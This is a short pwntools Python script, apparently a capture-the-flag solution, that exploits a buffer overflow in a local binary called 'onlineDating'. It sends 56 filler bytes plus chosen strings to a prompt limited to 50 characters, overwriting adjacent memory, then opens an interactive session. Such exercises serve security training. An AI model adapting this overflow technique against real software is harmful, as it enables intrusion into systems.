from pwn import *

payload = b'A'* 56 + b'Gerard_Pique' + b'Clara_C.' + b'TwingoOo' + b'CasioOo!'

# r = gdb.debug('./onlineDating')
r = process('./onlineDating.exe')
r.sendlineafter(b'Please tell us how to update it (max 50 char):', payload)
r.interactive()